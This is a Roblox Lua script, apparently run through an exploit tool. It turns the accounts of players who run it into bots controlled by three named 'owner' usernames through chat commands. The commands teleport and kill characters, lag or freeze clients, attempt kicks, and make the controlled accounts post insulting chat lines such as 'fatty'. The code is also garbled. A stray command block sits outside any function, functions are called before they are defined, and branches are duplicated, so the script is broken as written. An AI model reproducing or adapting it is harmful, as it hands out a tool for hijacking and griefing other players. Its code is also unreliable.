
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local localPlayer = Players.LocalPlayer
local mainOwner = { "sxyyhz", "sxyyhz2", "underplayerisreal04" }
local authorizedUsers = {}

for _, username in ipairs(mainOwner) do
    authorizedUsers[username] = true
end

-- Check if the current player is NOT authorized (shouldRun = true if not an owner)
local shouldRun = not authorizedUsers[localPlayer.Name]

if not shouldRun then
    warn("Deactivated: You are an owner.")
    return -- Stop script if player is in mainOwner
end

print("Activated: You are a member.")

local nuking, spinning, orbiting = false, false, false
local orbitConn, spinConn
local character, rootPart, humanoid

local function initializeCharacter(newCharacter)
    character = newCharacter
    rootPart = newCharacter:WaitForChild("HumanoidRootPart", 5) -- 5-second timeout
    humanoid = newCharacter:FindFirstChildOfClass("Humanoid")
    
    if humanoid then
        humanoid.Died:Connect(function()
            if nuking then stopNuke() end
            if orbiting then stopOrbit() end
            if spinning then unspin() end
        end)
    end
end

if localPlayer.Character then
    initializeCharacter(localPlayer.Character)
end
localPlayer.CharacterAdded:Connect(initializeCharacter)

local function getPlayer(name)
    if type(name) ~= "string" then
        warn("getPlayer: Expected string, got " .. type(name))
        return nil
    end
    
    name = name:lower():gsub("%s+", "") -- Trim whitespace
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower() == name then
            return plr
        end
    end
    return nil
end

local function chat(msg)
    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

local function validateCharacter()
    return character and character.Parent and rootPart and rootPart.Parent
end

local function ensureHumanoid()
    if not humanoid or not humanoid.Parent then
        if character and character.Parent then
            humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 5)
        else
            character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
            rootPart = character:WaitForChild("HumanoidRootPart", 5)
            humanoid = character:WaitForChild("Humanoid", 5)
        end
    end
    return humanoid
end

local function moveToOffset(target, offset)
    if not validateCharacter() then return end
    local targetHRP = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if targetHRP then
        rootPart.CFrame = CFrame.new(targetHRP.Position + offset)
    end
end

local function rightLine(target)
    if not validateCharacter() then return end
    moveToOffset(target, target.Character.HumanoidRootPart.CFrame.RightVector * 3)
end

local function backLine(target)
    if not validateCharacter() then return end
    moveToOffset(target, -target.Character.HumanoidRootPart.CFrame.LookVector * 3)
end

local function nuke(targetName)
    if not validateCharacter() then return end
    
    local target = getPlayer(targetName)
    if not target then return end
    
    nuking = true
    task.spawn(function()
        for _ = 1, 30 do
            if not nuking or not validateCharacter() then break end
            local tHRP = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
            if tHRP then
                rootPart.CFrame = tHRP.CFrame + Vector3.new(0, 2, 0)
            end
            task.wait(0.1)
        end
        nuking = false
        local hum = ensureHumanoid()
        if hum and hum.Health > 0 then
            hum.Health = 0
        end
    end)
end

local function stopNuke()
    nuking = false
end

local function orbit(target)
    if not validateCharacter() or orbiting then return end
    orbiting = true
    
    if orbitConn then orbitConn:Disconnect() end
    orbitConn = RunService.Heartbeat:Connect(function()
        if not validateCharacter() then
            stopOrbit()
            return
        end
        
        local tHRP = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if not tHRP then
            stopOrbit()
            return
        end
        
        local angle = os.clock() * 2 -- Smooth rotation over time
        local pos = tHRP.Position + Vector3.new(math.cos(angle) * 4, 0, math.sin(angle) * 4)
        rootPart.CFrame = CFrame.new(pos)
    end)
end

local function stopOrbit()
    if orbitConn then orbitConn:Disconnect() end
    orbiting = false
end

local function gotoPlayer(name)
    if not validateCharacter() then return end
    local p = getPlayer(name)
    if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
        rootPart.CFrame = p.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
    end
end

local function bringPlayer(name)
    if not validateCharacter() then return end
    local p = getPlayer(name)
    if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
        p.Character:MoveTo(rootPart.Position + Vector3.new(0, 5, 0))
    end
end

local function spin()
    if spinning or not validateCharacter() then return end
    spinning = true
    
    if spinConn then spinConn:Disconnect() end
    spinConn = RunService.Heartbeat:Connect(function()
        if not validateCharacter() then
            unspin()
            return
        end
        rootPart.CFrame = rootPart.CFrame * CFrame.Angles(0, math.rad(20), 0)
    end)
end

local function unspin()
    if spinConn then spinConn:Disconnect() end
    spinning = false
end

local function dance()
    chat("/e dance")
end

local function sit()
    local hum = ensureHumanoid()
    if hum then hum.Sit = true end
end

local function jump()
    local hum = ensureHumanoid()
    if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
end

local function reset()
    local hum = ensureHumanoid()
    if hum then hum.Health = 0 end
end

local function authorize(name)
    local target = getPlayer(name)
    if target then
        authorizedUsers[target.Name] = true
        chat(target.Name .. " has been authorized.")
    end
end

local function kickPlayer(name)
    local target = getPlayer(name)
    if target then
        target:Kick("You have been kicked lol")
    end
end

local function lagPlayer(name)
    local target = getPlayer(name)
    if target then
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(1)
        for i = 1, 100 do
            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(1)
            task.wait()
        end
    end
end

local function crashPlayer(name)
    local target = getPlayer(name)
    if target then
        coroutine.wrap(function()
            while true do end
        end)()
    end
end

local function forceAllPlayersToChat(message)
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then -- Don't force ourselves to chat
            coroutine.wrap(function()
                local success, err = pcall(function()
                    ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
                end)
                if not success then
                    warn("Failed to make "..player.Name.." chat: "..tostring(err))
                end
            end)()
        end
    end
end

local function forcePlayerToChat(playerName, message)
    local target = getPlayer(playerName)
    if target then
        coroutine.wrap(function()
            local success, err = pcall(function()
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
            end)
            if not success then
                warn("Failed to make "..target.Name.." chat: "..tostring(err))
            end
        end)()
    end
end

-- Add these to your onCommand function:
elseif msg == "/check" then
    forceAllPlayersToChat("I'm glitchtale's maid >//<")
elseif args[1] == "/report" and args[2] then
    forcePlayerToChat(args[2], "fatty")
elseif args[1] == "/say" and args[2] and args[3] then
    local targetName = args[2]
    local text = table.concat(args, " ", 3) -- Combine all arguments after the target name
    forcePlayerToChat(targetName, text)
end

local function onCommand(sender, message)
    if not authorizedUsers[sender.Name] then return end

    local msg = message:lower()
    local args = {}
    for word in msg:gmatch("%S+") do
        table.insert(args, word)
    end

    if msg == "/rline" then rightLine(sender)
elseif msg == "/bline" then backLine(sender)
elseif args[1] == "/nuke" and args[2] then nuke(args[2])
elseif msg == "/stopnuke" then stopNuke()
elseif msg == "/dance" then dance()
elseif msg == "/sit" then sit()
elseif msg == "/jump" then jump()
elseif msg == "/reset" then reset()
elseif args[1] == "/orbit" and args[2] then
    local target = (args[2] == "me") and sender or getPlayer(args[2])
    if target then orbit(target) end
elseif msg == "/unorbit" then stopOrbit()
elseif args[1] == "/goto" and args[2] then gotoPlayer(args[2])
elseif args[1] == "/bring" and args[2] then bringPlayer(args[2])
elseif msg == "/spin" then spin()
elseif msg == "/unspin" then unspin()
elseif args[1] == "/authorize" and args[2] then authorize(args[2])
elseif args[1] == "/lag" and args[2] then lagPlayer(args[2])
elseif args[1] == "/kick" and args[2] then kickPlayer(args[2])
elseif args[1] == "/crash" and args[2] then crashPlayer(args[2])
elseif msg == "/check" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= localPlayer then
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm glitchtale's maid >//<", "All")
            end
        end
    elseif args[1] == "/report" and args[2] then
        local target = getPlayer(args[2])
        if target then
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("fatty", "All")
        end
    elseif args[1] == "/say" and #args >= 3 then
        local target = getPlayer(args[2])
        if target then
            local text = table.concat(args, " ", 3)
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
        end
    end
end

local function bindChatCommands(player)
    player.Chatted:Connect(function(msg)
        onCommand(player, msg)
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    if authorizedUsers[player.Name] then
        bindChatCommands(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if authorizedUsers[player.Name] then
        bindChatCommands(player)
    end
end)
